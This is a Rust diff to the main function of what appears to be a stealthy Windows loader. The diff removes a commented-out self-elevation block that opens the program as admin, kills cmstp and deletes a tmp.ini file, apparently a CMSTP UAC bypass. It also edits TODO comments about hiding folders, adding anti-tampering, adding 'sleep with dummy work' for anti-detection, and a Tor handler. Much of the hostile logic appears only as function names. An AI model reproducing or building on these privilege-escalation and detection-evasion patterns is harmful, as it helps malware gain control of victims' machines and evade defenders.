@@ -137,39 +137,6 @@ fn main() {
 
     let mib_config = load_mib_config(false);
 
-    // if !is_elevated {
-    //     if !mib_config.cln_up_done {
-    //         if
-    //             let Ok(out) = get_service_install_state(
-    //                 &loader_service_name(),
-    //                 get_current_exe().to_str().unwrap()
-    //             )
-    //         {
-    //             match out.0 {
-    //                 SrvcIstlState::ExistsSameExe => {
-    //                     tag!("DISMISS-ELEVATE-CLEAN-UP-IN-PROGRESS");
-    //                     exit_1();
-    //                 }
-    //                 _ => {}
-    //             }
-    //         }
-    //     }
-
-    //     tag!("ELEVATE");
-
-    //     if let Err(error) = open_self_as_admin() {
-    //         err!("open_self_as_admin Error: ", error);
-    //     }
-    //     let cmstp_cleanup_handle = thread::spawn(move || {
-    //         if let Err(error) = try_kill_cmstp() {
-    //             err!("try_kill_cmstp Error: ", error);
-    //         }
-    //         std::fs::remove_file(get_current_exe_dir().join(s!("tmp.ini")))
-    //     });
-    //     let _ = cmstp_cleanup_handle.join();
-    //     exit_1();
-    // }
-
     let is_service = is_running_as_windows_service().unwrap_or_else(|error| {
         err!("is_running_as_windows_service Error, assuming true:", error);
         true
@@ -225,12 +192,9 @@ fn main() {
     exit_1();
 }
 
-// move logs elsewhere? idk honestly - after install system
 // hide folders?
-// rewrite everything where we get checks as variables and then each call is just a combination of checks, and they are ordered by the order of how we decide
 // add FULL anti tampering
 
-// improve clean up a little to not look dirty
-// add sleep in between for anti detect
+// add sleep with dummy work in between for anti detect
 // fix tor handler logger abomination
 // in logger setup so that we save last log and if identical - we use (count) that repeats AND rewrite logger with thought
